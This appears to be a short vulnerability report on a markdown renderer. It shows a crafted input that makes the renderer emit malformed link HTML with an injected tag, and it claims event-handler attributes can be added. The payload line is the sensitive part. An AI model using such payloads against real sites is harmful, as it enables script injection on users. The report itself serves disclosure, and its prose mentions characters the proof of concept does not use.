Summary:

When markdown is being presented as HTML, there seems to be a strange interaction between _ and @ that lets an attacker insert malicious tags.

# Proof of Concept :
```
</http:<marquee>hello
```

is rendered converted to the following HTML:

```
<p><a title="/http:<marquee" href="/http:%3Cmarquee" target="_blank">/http:<marquee>hello</p>
</marquee></a></p>
```
As you can see, the output includes a </http:<marquee tag that I can add arbitrary attributes (including event handlers).
